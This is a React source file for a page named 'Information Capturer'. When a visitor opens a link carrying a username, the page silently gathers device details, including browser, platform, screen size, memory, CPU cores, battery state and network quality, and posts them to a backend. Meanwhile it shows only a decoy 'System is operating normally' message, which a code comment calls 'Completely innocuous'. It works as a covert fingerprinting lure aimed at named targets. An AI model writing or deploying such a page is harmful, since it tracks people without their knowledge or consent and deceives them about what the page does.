import { useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useRecordVisit } from "@workspace/api-client-react";

export default function VisitorPage() {
  const [location] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const username = searchParams.get("username");
  const { mutate } = useRecordVisit();
  const captured = useRef(false);

  useEffect(() => {
    // Only capture once, and only if a username is provided
    if (!username || captured.current) return;
    captured.current = true;

    const capture = async () => {
      const data: any = {
        username,
        ua: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenDpr: window.devicePixelRatio,
        memoryGb: (navigator as any).deviceMemory,
        cpuCores: navigator.hardwareConcurrency,
        touchPoints: navigator.maxTouchPoints,
        lang: navigator.language,
      };

      if ((navigator as any).getBattery) {
        try {
          const battery = await (navigator as any).getBattery();
          data.batteryLevel = battery.level;
          data.batteryCharging = battery.charging;
        } catch (e) {
          // ignore
        }
      }

      if ((navigator as any).connection) {
        const conn = (navigator as any).connection;
        data.networkType = conn.effectiveType || conn.type;
        data.networkDownlink = conn.downlink;
        data.networkRtt = conn.rtt;
      }

      mutate({ data });
    };

    capture();
  }, [username, mutate]);

  // Completely innocuous, boring page.
  return (
    <div className="min-h-[100dvh] w-full flex flex-col items-center justify-center bg-white text-gray-800 font-sans p-6">
      <div className="text-center max-w-md w-full">
        <div className="w-12 h-12 bg-gray-100 rounded-xl mx-auto mb-6 flex items-center justify-center">
          <svg
            className="w-6 h-6 text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h1 className="text-2xl font-semibold tracking-tight text-gray-900 mb-2">
          Information Capturer
        </h1>
        <p className="text-gray-500 text-sm leading-relaxed">
          System is operating normally. All services are currently active and available.
        </p>
      </div>
    </div>
  );
}
